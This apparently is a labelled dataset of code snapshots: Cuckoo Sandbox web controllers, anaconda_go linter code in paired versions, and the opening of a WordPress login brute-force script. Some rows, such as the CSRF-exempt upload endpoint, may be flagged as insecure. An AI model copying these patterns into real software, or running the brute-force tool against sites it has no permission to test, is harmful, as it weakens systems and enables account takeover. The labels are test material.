                self._handle_string(submit_data, path_tmp, line)

        if submit_type == ""files"":
            for entry in data:
                filename = Storage.get_filename_from_path(entry[""name""])
                filepath = Files.create(path_tmp, filename, entry[""data""])
                submit_data[""data""].append({
                    ""type"": ""file"",
                    ""data"": filepath
                })

        return Database().add_submit(path_tmp, submit_type, submit_data)

    def get_files(self, submit_id, password=None, astree=False):
        """"""
        Returns files from a submitted analysis.
        @param password: The password to unlock container archives with
        @param astree: sflock option; determines the format in which the files are returned
        @return: A tree of files
        """"""
        submit = Database().view_submit(submit_id)
        files, duplicates = [], []

        for data in submit.data[""data""]:
            if data[""type""] == ""file"":
                filename = Storage.get_filename_from_path(data[""data""])
                filepath = os.path.join(submit.tmp_path, data[""data""])
                filedata = open(filepath, ""rb"").read()

                unpacked = sflock.unpack(
                    filepath=filename, contents=filedata,
                    password=password, duplicates=duplicates
                )

                if astree:
                    unpacked = unpacked.astree()

                files.append(unpacked)
            elif data[""type""] == ""url"":
                files.append({
                    ""filename"": data[""data""],
                    ""filepath"": """",
                    ""relapath"": """",
                    ""selected"": True,
                    ""size"": 0,
                    ""type"": ""url"",
                    ""package"": ""ie"",
                    ""extrpath"": [],
                    ""duplicate"": False,
                    ""children"": [],
                    ""mime"": ""text/html"",
                    ""finger"": {
                        ""magic_human"": ""url"",
                        ""magic"": ""url""
                    }
                })
            else:
                raise RuntimeError(
                    ""Unknown data entry type: %s"" % data[""type""]
                )

        return {
            ""files"": files,
            ""path"": submit.tmp_path,
        }

    def translate_options(self, info, options):
        """"""Translates Web Interface options to Cuckoo database options.""""""
        ret = {}

        if not int(options[""simulated-human-interaction""]):
            ret[""human""] = int(options[""simulated-human-interaction""])

        return emit_options(ret)

    def submit(self, submit_id, config):
        """"""Reads, interprets, and converts the JSON configuration provided by
        the Web Interface into something we insert into the database.""""""
        ret = []
        submit = db.view_submit(submit_id)

        for entry in config[""file_selection""]:
            # Merge the global & per-file analysis options.
            info = copy.deepcopy(config[""global""])
            info.update(entry)
            options = copy.deepcopy(config[""global""][""options""])
            options.update(entry.get(""per_file_options"", {}))

            kw = {
                ""package"": info.get(""package""),
                ""timeout"": info.get(""timeout"", 120),
                ""priority"": info.get(""priority""),
                ""custom"": info.get(""custom""),
                ""owner"": info.get(""owner""),
                ""tags"": info.get(""tags""),
                ""memory"": info.get(""memory""),
                ""enforce_timeout"": options.get(""enforce-timeout""),
                ""machine"": info.get(""machine""),
                ""platform"": info.get(""platform""),
                ""options"": self.translate_options(info, options),
                ""submit_id"": submit_id,
            }

            if entry[""type""] == ""url"":
                ret.append(db.add_url(
                    url=info[""filename""], **kw
                ))
                continue

            # for each selected file entry, create a new temp. folder
            path_dest = Folders.create_temp()

            if not info[""extrpath""]:
                path = os.path.join(
                    submit.tmp_path, os.path.basename(info[""filename""])
                )

                filepath = Files.copy(path, path_dest=path_dest)

                ret.append(db.add_path(
                    file_path=filepath, **kw
                ))
            elif len(info[""extrpath""]) == 1:
                arcpath = os.path.join(
                    submit.tmp_path, os.path.basename(info[""arcname""])
                )
                if not os.path.exists(arcpath):
                    submit.data[""errors""].append(
                        ""Unable to find parent archive file: %s"" %
                        os.path.basename(info[""arcname""])
                    )
                    continue

                arc = sflock.zipify(sflock.unpack(
                    info[""arcname""], contents=open(arcpath, ""rb"").read()
                ))

                # Create a .zip archive out of this container.
                arcpath = Files.temp_named_put(
                    arc, os.path.basename(info[""arcname""])
                )

                ret.append(db.add_archive(
                    file_path=arcpath, filename=info[""filename""], **kw
                ))
            else:
                arcpath = os.path.join(
                    submit.tmp_path, os.path.basename(info[""arcname""])
                )
                if not os.path.exists(arcpath):
                    submit.data[""errors""].append(
                        ""Unable to find parent archive file: %s"" %
                        os.path.basename(info[""arcname""])
                    )
                    continue

                content = sflock.unpack(arcpath).read(info[""extrpath""][:-1])
                subarc = sflock.unpack(info[""extrpath""][-2], contents=content)

                # Write intermediate .zip archive file.
                arcpath = Files.temp_named_put(
                    sflock.zipify(subarc),
                    os.path.basename(info[""extrpath""][-2])
                )

                ret.append(db.add_archive(
                    file_path=arcpath, filename=info[""filename""], **kw
                ))

        return ret
/n/n/n/cuckoo/web/controllers/analysis/analysis.py/n/n# Copyright (C) 2010-2013 Claudio Guarnieri.
# Copyright (C) 2014-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import collections
import os
import pymongo

from django.http import Http404

from cuckoo.core.database import Database, TASK_PENDING
from cuckoo.common.mongo import mongo

db = Database()

class AnalysisController:
    @staticmethod
    def task_info(task_id):
        if not isinstance(task_id, int):
            raise Exception(""Task ID should be integer"")
        data = {}

        task = db.view_task(task_id, details=True)
        if task:
            entry = task.to_dict()
            entry[""guest""] = {}
            if task.guest:
                entry[""guest""] = task.guest.to_dict()

            entry[""errors""] = []
            for error in task.errors:
                entry[""errors""].append(error.message)

            entry[""sample""] = {}
            if task.sample_id:
                sample = db.view_sample(task.sample_id)
                entry[""sample""] = sample.to_dict()

            data[""task""] = entry
        else:
            return Exception(""Task not found"")

        return data

    @staticmethod
    def get_recent(limit=50, offset=0):
        db = Database()
        tasks_files = db.list_tasks(
            limit=limit,
            offset=offset,
            category=""file"",
            not_status=TASK_PENDING)

        tasks_urls = db.list_tasks(
            limit=limit,
            offset=offset,
            category=""url"",
            not_status=TASK_PENDING)

        data = []
        if tasks_files:
            for task in tasks_files:
                new = task.to_dict()
                new[""sample""] = db.view_sample(new[""sample_id""]).to_dict()

                filename = os.path.basename(new[""target""])
                new.update({""filename"": filename})

                if db.view_errors(task.id):
                    new[""errors""] = True

                data.append(new)

        if tasks_urls:
            for task in tasks_urls:
                new = task.to_dict()

                if db.view_errors(task.id):
                    new[""errors""] = True

                data.append(new)

        return data

    @staticmethod
    def get_report(task_id):
        report = AnalysisController._get_report(task_id)
        if not report:
            raise Http404(""the specified analysis does not exist"")

        data = {
            ""analysis"": report
        }

        dnsinfo = AnalysisController._get_dnsinfo(report)
        data.update(dnsinfo)
        return data

    @staticmethod
    def _get_report(task_id):
        return mongo.db.analysis.find_one({
            ""info.id"": int(task_id)
        }, sort=[(""_id"", pymongo.DESCENDING)])

    @staticmethod
    def get_reports(filters):
        cursor = mongo.db.analysis.find(
            filters, sort=[(""_id"", pymongo.DESCENDING)]
        )
        return [report for report in cursor]

    @staticmethod
    def _get_dnsinfo(report):
        """"""Create DNS information dicts by domain and ip""""""

        if ""network"" in report and ""domains"" in report[""network""]:
            domainlookups = dict((i[""domain""], i[""ip""]) for i in report[""network""][""domains""])
            iplookups = dict((i[""ip""], i[""domain""]) for i in report[""network""][""domains""])

            for i in report[""network""][""dns""]:
                for a in i[""answers""]:
                    iplookups[a[""data""]] = i[""request""]
        else:
            domainlookups = dict()
            iplookups = dict()

        return {
            ""domainlookups"": domainlookups,
            ""iplookups"": iplookups,
        }

    @staticmethod
    def get_behavior(task_id, report=None):
        """"""
        Returns behavioral information about an analysis
        sorted by category (files, registry, mutexes, etc)
        @param task_id: The analysis ID
        @param report: JSON analysis blob that is stored in MongoDB (results.json)
        @return: behavioral information as a dict
        """"""
        data = {}
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]
        procs = AnalysisController.behavior_get_processes(task_id, report)

        for proc in procs[""data""]:
            pid = proc[""pid""]
            pname = proc[""process_name""]
            pdetails = None
            for p in report[""behavior""][""generic""]:
                if p[""pid""] == pid:
                    pdetails = p
            if not pdetails:
                continue

            watchers = AnalysisController.behavior_get_watchers(
                task_id, pid=pid, report=report)

            for category, events in watchers.iteritems():
                if not data.has_key(category):
                    data[category] = {}
                if not data[category].has_key(pid):
                    data[category][pname] = {
                        ""pid"": pid,
                        ""process_name"": pname,
                        ""events"": {}
                    }

                for event in events:
                    if not data[category][pname][""events""].has_key(event):
                        data[category][pname][""events""][event] = []
                    for _event in pdetails[""summary""][event]:
                        data[category][pname][""events""][event].append(_event)

        return data

    @staticmethod
    def behavior_get_processes(task_id, report=None):
        if not task_id:
            raise Exception(""missing task_id"")
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]

        data = {
            ""data"": [],
            ""status"": True
        }

        for process in report.get(""behavior"", {}).get(""generic"", []):
            data[""data""].append({
                ""process_name"": process[""process_name""],
                ""pid"": process[""pid""]
            })

        # sort returning list of processes by their name
        data[""data""] = sorted(data[""data""], key=lambda k: k[""process_name""])

        return data

    @staticmethod
    def behavior_get_watchers(task_id, pid, report=None):
        if not task_id or not pid:
            raise Exception(""missing task_id or pid"")
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]

        behavior_generic = report[""behavior""][""generic""]
        process = [z for z in behavior_generic if z[""pid""] == pid]

        if not process:
            raise Exception(""missing pid"")
        else:
            process = process[0]

        data = {}
        for category, watchers in AnalysisController.behavioral_mapping().iteritems():
            for watcher in watchers:
                if watcher in process[""summary""]:
                    if category not in data:
                        data[category] = [watcher]
                    else:
                        data[category].append(watcher)

        return data

    @staticmethod
    def behavior_get_watcher(task_id, pid, watcher, limit=None, offset=0, report=None):
        if not task_id or not watcher or not pid:
            raise Exception(""missing task_id, watcher, and/or pid"")
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]

        behavior_generic = report[""behavior""][""generic""]
        process = [z for z in behavior_generic if z[""pid""] == pid]

        if not process:
            raise Exception(""supplied pid not found"")
        else:
            process = process[0]

        summary = process[""summary""]

        if watcher not in summary:
            raise Exception(""supplied watcher not found"")
        if offset:
            summary[watcher] = summary[watcher][offset:]
        if limit:
            summary[watcher] = summary[watcher][:limit]

        return summary[watcher]

    @staticmethod
    def behavioral_mapping():
        return {
            ""files"":
                [""file_opened"", ""file_read""],
            ""registry"":
                [""regkey_opened"", ""regkey_written"", ""regkey_read""],
            ""mutexes"":
                [""mutex""],
            ""directories"":
                [""directory_created"", ""directory_removed"", ""directory_enumerated""],
            ""processes"":
                [""command_line"", ""dll_loaded""],
        }

    @staticmethod
    def signatures(task_id, signatures=None):
        """"""Returns an OrderedDict containing a lists with signatures based on severity""""""
        if not task_id:
            raise Exception(""missing task_id"")
        if not signatures:
            signatures = AnalysisController.get_report(task_id)[""signatures""]

        data = collections.OrderedDict()
        for signature in signatures:
            severity = signature[""severity""]
            if severity > 3:
                severity = 3
            if not data.has_key(severity):
                data[severity] = []
            data[severity].append(signature)
        return data
/n/n/n/cuckoo/web/controllers/submission/api.py/n/n# Copyright (C) 2010-2013 Claudio Guarnieri.
# Copyright (C) 2014-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import json

from django.http import JsonResponse
from django.shortcuts import redirect
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_http_methods

from cuckoo.common.config import config
from cuckoo.core.submit import SubmitManager
from cuckoo.web.bin.utils import api_post, JsonSerialize, json_error_response

submit_manager = SubmitManager()

def defaults():
    machinery = config(""cuckoo:cuckoo:machinery"")

    if config(""routing:vpn:enabled""):
        vpns = config(""routing:vpn:vpns"")
    else:
        vpns = []

    return {
        ""machine"": config(""%s:%s:machines"" % (machinery, machinery)),
        ""package"": None,
        ""priority"": 2,
        ""timeout"": config(""cuckoo:timeouts:default""),
        ""routing"": {
            ""route"": config(""routing:routing:route""),
            ""inetsim"": config(""routing:inetsim:enabled""),
            ""tor"": config(""routing:tor:enabled""),
            ""vpns"": vpns,
        },
        ""options"": {
            ""enable-services"": False,
            ""enforce-timeout"": False,
            ""full-memory-dump"": config(""cuckoo:cuckoo:memory_dump""),
            ""no-injection"": False,
            ""process-memory-dump"": True,
            ""simulated-human-interaction"": True,
        },
    }

class SubmissionApi(object):
    @staticmethod
    @csrf_exempt
    @require_http_methods([""POST""])
    def presubmit(request):
        files = request.FILES.getlist(""files[]"")
        data = []

        if files:
            for f in files:
                data.append({
                    ""name"": f.name,
                    ""data"": f.file,
                })

            submit_id = submit_manager.pre(submit_type=""files"", data=data)
            return redirect(""submission/pre"", submit_id=submit_id)
        else:
            body = json.loads(request.body)
            submit_type = body[""type""]

            if submit_type != ""strings"":
                return json_error_response(""type not \""strings\"""")

            submit_id = submit_manager.pre(
                submit_type=submit_type, data=body[""data""].split(""\n"")
            )

            return JsonResponse({
                ""status"": True,
                ""submit_id"": submit_id,
            }, encoder=JsonSerialize)

    @api_post
    def get_files(request, body):
        submit_id = body.get(""submit_id"", 0)
        password = body.get(""password"", None)
        astree = body.get(""astree"", True)

        data = submit_manager.get_files(
            submit_id=submit_id,
            password=password,
            astree=astree
        )

        return JsonResponse({
            ""status"": True,
            ""data"": data,
            ""defaults"": defaults(),
        }, encoder=JsonSerialize)

    @api_post
    def submit(request, body):
        submit_id = body.pop(""submit_id"", None)
        submit_manager.submit(
            submit_id=submit_id, config=body
        )
        return JsonResponse({
            ""status"": True,
            ""submit_id"": submit_id,
        }, encoder=JsonSerialize)
/n/n/n",1
74,d3db90bb8853d832927818699591b91f56f6413c,"lib/_sublime.py/n/n
# Copyright (C) 2016 - Oscar Campos <oscar.campos@member.fsf.org>
# This program is Free Software see LICENSE file for details

import os
from functools import partial

from anaconda_go.lib import go
from anaconda_go.lib.helpers import get_settings, active_view
from anaconda_go.lib.plugin import anaconda_sublime, Worker, Callback

import sublime as st3_sublime


def run_linter(view=None, hook=None):
    """"""Wrapper to run the right linter
    """"""

    if not go.ANAGONDA_PRESENT:
        return

    if get_settings(view, 'anaconda_go_fast_linters_only', False):
        fast_linters(view, hook)
    else:
        all_linters(view, hook)


def fast_linters(view=None, hook=None):
    """"""Run gometalinter fast linters only
    """"""

    if view is None:
        view = active_view()

    if not get_settings(view, 'anaconda_go_linting', True):
        return

    if view.file_name() in anaconda_sublime.ANACONDA['DISABLED']:
        anaconda_sublime.erase_lint_marks(view)
        return

    settings = _get_settings(view)

    data = {
        'vid': view.id(),
        'code': view.substr(st3_sublime.Region(0, view.size())),
        'settings': settings,
        'filepath': view.file_name(),
        'method': 'fast_lint',
        'handler': 'anaGonda',
        'go_env': {
            'GOROOT': go.GOROOT,
            'GOPATH': go.GOPATH,
            'CGO_ENABLED': go.CGO_ENABLED
        }
    }

    callback = partial(anaconda_sublime.parse_results, **dict(code='go'))
    if hook is None:
        Worker().execute(Callback(on_success=callback), **data)
    else:
        Worker().execute(Callback(partial(hook, callback)), **data)


def slow_linters(view=None, hook=None):
    """"""Run slow gometalinter linters
    """"""

    if view is None:
        view = active_view()

    if not get_settings(view, 'anaconda_go_linting', True):
        return

    if view.file_name() in anaconda_sublime.ANACONDA['DISABLED']:
        anaconda_sublime.erase_lint_marks(view)
        return

    settings = _get_settings(view)

    data = {
        'vid': view.id(),
        'code': view.substr(st3_sublime.Region(0, view.size())),
        'settings': settings,
        'filepath': view.file_name(),
        'method': 'slow_lint',
        'handler': 'anaGonda',
        'go_env': {
            'GOROOT': go.GOROOT,
            'GOPATH': go.GOPATH,
            'CGO_ENABLED': go.CGO_ENABLED
        }
    }

    callback = partial(anaconda_sublime.parse_results, **dict(code='go'))
    if hook is None:
        Worker().execute(Callback(on_success=callback), **data)
    else:
        Worker().execute(Callback(partial(hook, callback)), **data)


def all_linters(view=None, hook=None):
    """"""Run all linters
    """"""

    if view is None:
        view = active_view()

    if not get_settings(view, 'anaconda_go_linting', True):
        return

    if view.file_name() in anaconda_sublime.ANACONDA['DISABLED']:
        anaconda_sublime.erase_lint_marks(view)
        return

    settings = _get_settings(view)

    data = {
        'vid': view.id(),
        'code': view.substr(st3_sublime.Region(0, view.size())),
        'settings': settings,
        'filepath': view.file_name(),
        'method': 'all_lint',
        'handler': 'anaGonda',
        'go_env': {
            'GOROOT': go.GOROOT,
            'GOPATH': go.GOPATH,
            'CGO_ENABLED': go.CGO_ENABLED
        }
    }

    callback = partial(anaconda_sublime.parse_results, **dict(code='go'))
    if hook is None:
        Worker().execute(Callback(on_success=callback), **data)
    else:
        Worker().execute(Callback(partial(hook, callback)), **data)


def _get_settings(view):
    return {
        'linters': get_settings(view, 'anaconda_go_linters', []),
        'lint_test': get_settings(
            view, 'anaconda_go_lint_test', False),
        'exclude_regexps': get_settings(
            view, 'anaconda_go_exclude_regexps', []),
        'max_line_length': get_settings(
            view, 'anaconda_go_max_line_length', 120),
        'gocyclo_threshold': get_settings(
            view, 'anaconda_go_gocyclo_threshold', 10),
        'golint_min_confidence': get_settings(
            view, 'anaconda_go_golint_min_confidence', 0.80),
        'goconst_min_occurrences': get_settings(
            view, 'anaconda_go_goconst_min_occurrences', 3),
        'min_const_length': get_settings(
            view, 'anaconda_go_min_const_length', 3),
        'dupl_threshold': get_settings(
            view, 'anaconda_go_dupl_threshold', 50),
        'path': os.path.dirname(view.file_name())
    }
/n/n/nplugin/handlers_go/anagonda/context/gometalinter.py/n/n
# Copyright (C) 2013 - 2016 - Oscar Campos <oscar.campos@member.fsf.org>
# This program is Free Software see LICENSE file for details

import os
import sys
import json
import shlex
from subprocess import PIPE

from process import spawn

from .error import AnaGondaError
from .base import AnaGondaContext

_go_get = 'gopkg.in/alecthomas/gometalinter.v1'


class GometaLinterError(AnaGondaError):
    """"""Fires on GometaLinter errors
    """"""


class GometaLinter(AnaGondaContext):
    """"""Context to run gometalinter tool into anaconda_go
    """"""

    def __init__(self, options, filepath, env_ctx):
        self.filepath = filepath
        self.options = options
        super(GometaLinter, self).__init__(env_ctx, _go_get)

    def __enter__(self):
        """"""Check binary existence and perform command
        """"""

        if self._bin_found is None:
            if not os.path.exists(self.binary):
                try:
                    self.go_get()
                    self._install_linters()
                except AnaGondaError:
                    self._bin_found = False
                    raise
            else:
                self._bin_found = True

        if not self._bin_found:
            raise GometaLinterError('{0} not found...'.format(self.binary))

        return self.gometalinter()

    def __exit__(self, *ext):
        """"""Do nothing
        """"""

    def gometalinter(self):
        """"""Run gometalinter and return back a JSON object with it's results
        """"""

        args = shlex.split(
            '{0} {1}'.format(self.binary, self.options), posix=os.name != 'nt'
        )
        gometalinter = spawn(args, stdout=PIPE, stderr=PIPE, env=self.env)
        out, err = gometalinter.communicate()
        if err is not None and len(err) > 0:
            if sys.version_info >= (3,):
                err = err.decode('utf8')
            raise GometaLinterError(err)

        if sys.version_info >= (3,):
            out = out.decode('utf8')

        return self._normalize(json.loads(out))

    def _install_linters(self):
        """"""Install gometalinter linters
        """"""

        args = shlex.split('{0} --install'.format(self.binary))
        gometalinter = spawn(args, stdout=PIPE, stderr=PIPE, env=self.env)
        _, err = gometalinter.communicate()
        if err is not None and len(err) > 0:
            if sys.version_info >= (3,):
                err = err.decode('utf8')
            raise GometaLinterError(err)

    def _normalize(self, metaerrors):
        """"""Normalize output format to be usable by Anaconda's linting frontend
        """"""

        errors = []
        for error in metaerrors:
            last_path = os.path.join(
                os.path.basename(os.path.dirname(self.filepath)),
                os.path.basename(self.filepath)
            )
            if last_path not in error.get('path', ''):
                continue

            error_type = error.get('severity', 'X').capitalize()[0]
            if error_type == 'X':
                continue
            if error_type not in ['E', 'W']:
                error_type = 'V'
            errors.append({
                'underline_range': True,
                'lineno': error.get('line', 0),
                'offset': error.get('col', 0),
                'raw_message': error.get('message', ''),
                'code': 0,
                'level': error_type,
                'message': '[{0}] {1} ({2}): {3}'.format(
                    error_type,
                    error.get('linter', 'none'),
                    error.get('severity', 'none'),
                    error.get('message')
                )
            })

        return errors

    @property
    def binary(self):
        """"""Return back the binary path
        """"""

        return os.path.join(self.env['GOPATH'], 'bin', 'gometalinter.v1')
/n/n/nplugin/handlers_go/commands/autocomplete.py/n/n
# Copyright (C) 2013 - 2016 - Oscar Campos <oscar.campos@member.fsf.org>
# This program is Free Software see LICENSE file for details

import logging
import traceback

from ..anagonda.context.autocomplete import AutoComplete
from commands.base import Command


class Gocode(Command):
    """"""Run GoCode
    """"""

    def __init__(self, callback, uid, vid, code, path, offset, param, go_env):
        self.vid = vid
        self.path = path
        self.code = code
        self.path = path
        self.offset = offset
        self.add_params = param
        self.go_env = go_env
        super(Gocode, self).__init__(callback, uid)

    def run(self):
        """"""Run the command
        """"""

        try:
            with AutoComplete(
                    self.code, self.path,
                    self.offset, self.add_params, self.go_env) as comps:
                self.callback({
                    'success': True,
                    'completions': comps,
                    'uid': self.uid,
                    'vid': self.vid
                })
        except Exception as error:
            logging.error(error)
            logging.debug(traceback.format_exc())
            self.callback({
                'success': False,
                'error': str(error),
                'uid': self.uid,
                'vid': self.vid
            })
/n/n/n",0
75,d3db90bb8853d832927818699591b91f56f6413c,"/lib/_sublime.py/n/n
# Copyright (C) 2016 - Oscar Campos <oscar.campos@member.fsf.org>
# This program is Free Software see LICENSE file for details

from functools import partial

from anaconda_go.lib import go
from anaconda_go.lib.helpers import get_working_directory
from anaconda_go.lib.helpers import get_settings, active_view
from anaconda_go.lib.plugin import anaconda_sublime, Worker, Callback

import sublime as st3_sublime


def run_linter(view=None, hook=None):
    """"""Wrapper to run the right linter
    """"""

    if not go.ANAGONDA_PRESENT:
        return

    if get_settings(view, 'anaconda_go_fast_linters_only', False):
        fast_linters(view, hook)
    else:
        all_linters(view, hook)


def fast_linters(view=None, hook=None):
    """"""Run gometalinter fast linters only
    """"""

    if view is None:
        view = active_view()

    if not get_settings(view, 'anaconda_go_linting', True):
        return

    if view.file_name() in anaconda_sublime.ANACONDA['DISABLED']:
        anaconda_sublime.erase_lint_marks(view)
        return

    settings = _get_settings(view)

    data = {
        'vid': view.id(),
        'code': view.substr(st3_sublime.Region(0, view.size())),
        'settings': settings,
        'filepath': view.file_name(),
        'method': 'fast_lint',
        'handler': 'anaGonda',
        'go_env': {
            'GOROOT': go.GOROOT,
            'GOPATH': go.GOPATH,
            'CGO_ENABLED': go.CGO_ENABLED
        }
    }

    callback = partial(anaconda_sublime.parse_results, **dict(code='go'))
    if hook is None:
        Worker().execute(Callback(on_success=callback), **data)
    else:
        Worker().execute(Callback(partial(hook, callback)), **data)


def slow_linters(view=None, hook=None):
    """"""Run slow gometalinter linters
    """"""

    if view is None:
        view = active_view()

    if not get_settings(view, 'anaconda_go_linting', True):
        return

    if view.file_name() in anaconda_sublime.ANACONDA['DISABLED']:
        anaconda_sublime.erase_lint_marks(view)
        return

    settings = _get_settings(view)

    data = {
        'vid': view.id(),
        'code': view.substr(st3_sublime.Region(0, view.size())),
        'settings': settings,
        'filepath': view.file_name(),
        'method': 'slow_lint',
        'handler': 'anaGonda',
        'go_env': {
            'GOROOT': go.GOROOT,
            'GOPATH': go.GOPATH,
            'CGO_ENABLED': go.CGO_ENABLED
        }
    }

    callback = partial(anaconda_sublime.parse_results, **dict(code='go'))
    if hook is None:
        Worker().execute(Callback(on_success=callback), **data)
    else:
        Worker().execute(Callback(partial(hook, callback)), **data)


def all_linters(view=None, hook=None):
    """"""Run all linters
    """"""

    if view is None:
        view = active_view()

    if not get_settings(view, 'anaconda_go_linting', True):
        return

    if view.file_name() in anaconda_sublime.ANACONDA['DISABLED']:
        anaconda_sublime.erase_lint_marks(view)
        return

    settings = _get_settings(view)

    data = {
        'vid': view.id(),
        'code': view.substr(st3_sublime.Region(0, view.size())),
        'settings': settings,
        'filepath': view.file_name(),
        'method': 'all_lint',
        'handler': 'anaGonda',
        'go_env': {
            'GOROOT': go.GOROOT,
            'GOPATH': go.GOPATH,
            'CGO_ENABLED': go.CGO_ENABLED
        }
    }

    callback = partial(anaconda_sublime.parse_results, **dict(code='go'))
    if hook is None:
        Worker().execute(Callback(on_success=callback), **data)
    else:
        Worker().execute(Callback(partial(hook, callback)), **data)


def _get_settings(view):
    return {
        'linters': get_settings(view, 'anaconda_go_linters', []),
        'lint_test': get_settings(
            view, 'anaconda_go_lint_test', False),
        'exclude_regexps': get_settings(
            view, 'anaconda_go_exclude_regexps', []),
        'max_line_length': get_settings(
            view, 'anaconda_go_max_line_length', 120),
        'gocyclo_threshold': get_settings(
            view, 'anaconda_go_gocyclo_threshold', 10),
        'golint_min_confidence': get_settings(
            view, 'anaconda_go_golint_min_confidence', 0.80),
        'goconst_min_occurrences': get_settings(
            view, 'anaconda_go_goconst_min_occurrences', 3),
        'min_const_length': get_settings(
            view, 'anaconda_go_min_const_length', 3),
        'dupl_threshold': get_settings(
            view, 'anaconda_go_dupl_threshold', 50),
        'path': get_working_directory(view)
    }
/n/n/n/plugin/handlers_go/anagonda/context/gometalinter.py/n/n
# Copyright (C) 2013 - 2016 - Oscar Campos <oscar.campos@member.fsf.org>
# This program is Free Software see LICENSE file for details

import os
import sys
import json
import shlex
from subprocess import PIPE

from process import spawn

from .error import AnaGondaError
from .base import AnaGondaContext

_go_get = 'gopkg.in/alecthomas/gometalinter.v1'


class GometaLinterError(AnaGondaError):
    """"""Fires on GometaLinter errors
    """"""


class GometaLinter(AnaGondaContext):
    """"""Context to run gometalinter tool into anaconda_go
    """"""

    def __init__(self, options, filepath, env_ctx):
        self.filepath = filepath
        self.options = options
        super(GometaLinter, self).__init__(env_ctx, _go_get)

    def __enter__(self):
        """"""Check binary existence and perform command
        """"""

        if self._bin_found is None:
            if not os.path.exists(self.binary):
                try:
                    self.go_get()
                    self._install_linters()
                except AnaGondaError:
                    self._bin_found = False
                    raise
            else:
                self._bin_found = True

        if not self._bin_found:
            raise GometaLinterError('{0} not found...'.format(self.binary))

        return self.gometalinter()

    def __exit__(self, *ext):
        """"""Do nothing
        """"""

    def gometalinter(self):
        """"""Run gometalinter and return back a JSON object with it's results
        """"""

        args = shlex.split(
            '{0} {1}'.format(self.binary, self.options), posix=os.name != 'nt'
        )
        gometalinter = spawn(args, stdout=PIPE, stderr=PIPE, env=self.env)
        out, err = gometalinter.communicate()
        if err is not None and len(err) > 0:
            if sys.version_info >= (3,):
                err = err.decode('utf8')
            raise GometaLinterError(err)

        if sys.version_info >= (3,):
            out = out.decode('utf8')

        return self._normalize(json.loads(out))

    def _install_linters(self):
        """"""Install gometalinter linters
        """"""

        args = shlex.split('{0} --install'.format(self.binary))
        gometalinter = spawn(args, stdout=PIPE, stderr=PIPE, env=self.env)
        _, err = gometalinter.communicate()
        if err is not None and len(err) > 0:
            if sys.version_info >= (3,):
                err = err.decode('utf8')
            raise GometaLinterError(err)

    def _normalize(self, metaerrors):
        """"""Normalize output format to be usable by Anaconda's linting frontend
        """"""

        errors = []
        for error in metaerrors:
            if self.filepath not in error.get('path', ''):
                continue

            error_type = error.get('severity', 'X').capitalize()[0]
            if error_type == 'X':
                continue
            if error_type not in ['E', 'W']:
                error_type = 'V'
            errors.append({
                'underline_range': True,
                'lineno': error.get('line', 0),
                'offset': error.get('col', 0),
                'raw_message': error.get('message', ''),
                'code': 0,
                'level': error_type,
                'message': '[{0}] {1} ({2}): {3}'.format(
                    error_type,
                    error.get('linter', 'none'),
                    error.get('severity', 'none'),
                    error.get('message')
                )
            })

        return errors

    @property
    def binary(self):
        """"""Return back the binary path
        """"""

        return os.path.join(self.env['GOPATH'], 'bin', 'gometalinter.v1')
/n/n/n/plugin/handlers_go/commands/autocomplete.py/n/n
# Copyright (C) 2013 - 2016 - Oscar Campos <oscar.campos@member.fsf.org>
# This program is Free Software see LICENSE file for details

import logging
import traceback

from ..anagonda.context.autocomplete import AutoComplete
from commands.base import Command


class Gocode(Command):
    """"""Run GoCode
    """"""

    def __init__(self, callback, uid, vid, code, path, offset, go_env):
        self.vid = vid
        self.path = path
        self.code = code
        self.path = path
        self.offset = offset
        self.go_env = go_env
        super(Gocode, self).__init__(callback, uid)

    def run(self):
        """"""Run the command
        """"""

        try:
            with AutoComplete(
                    self.code, self.path, self.offset, self.go_env) as comps:
                self.callback({
                    'success': True,
                    'completions': comps,
                    'uid': self.uid,
                    'vid': self.vid
                })
        except Exception as error:
            logging.error(error)
            logging.debug(traceback.format_exc())
            self.callback({
                'success': False,
                'error': str(error),
                'uid': self.uid,
                'vid': self.vid
            })
/n/n/n",1
76,e6f712be9793480507e5de7b2b1f82bc041dff37,"wpbf.py/n/n#!/usr/bin/env python
""""""
wpbf is a WordPress BruteForce script to remotely test password strength of the WordPress blogging software

Copyright 2011 Andres Tarantini (atarantini@gmail.com)

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
""""""
import logging, logging.config
import urllib2, urlparse
import sys, threading, Queue, time, argparse

import config, wplib, wpworker

if __name__ == '__main__':
    #parse command line arguments
    parser = argparse.ArgumentParser(description='Bruteforce WordPress login form to test password strenght. Currently supports threads, wordlist and basic username detection.')
    parser.add_argument('url', type=str,  help='base URL where WordPress is installed')
    parser.add_argument('-w', '--wordlist', default=config.wordlist, help=""worldlist file (default: ""+config.wordlist+"")"")
    parser.add_argument('-nk', '--nokeywords', action=""store_false"", help=""Don't search keywords in content and add them to the wordlist"")
    parser.add_argument('-u', '--username', default=config.username, help=""username (default: ""+str(config.username)+"")"")
    parser.add_argument('-s', '--scriptpath', default=config.script_path, help=""path to the login form (default: ""+config.script_path+"")"")
    parser.add_argument('-t', '--threads', type=int, default=config.threads, help=""how many threads the script will spawn (default: ""+str(config.threads)+"")"")
    parser.add_argument('-p', '--proxy', default=None, help=""http proxy (ex: http://localhost:8008/)"")
    parser.add_argument('-nf', '--nofingerprint', action=""store_false"", help=""Don't fingerprint WordPress"")
    parser.add_argument('-eu', '--enumerateusers', action=""store_true"", help=""Only enumerate users (withouth bruteforcing)"")
    parser.add_argument('-eut', '--enumeratetolerance', type=int, default=config.eu_gap_tolerance, help=""User ID gap tolerance to use in username enumeration (default: ""+str(config.eu_gap_tolerance)+"")"")
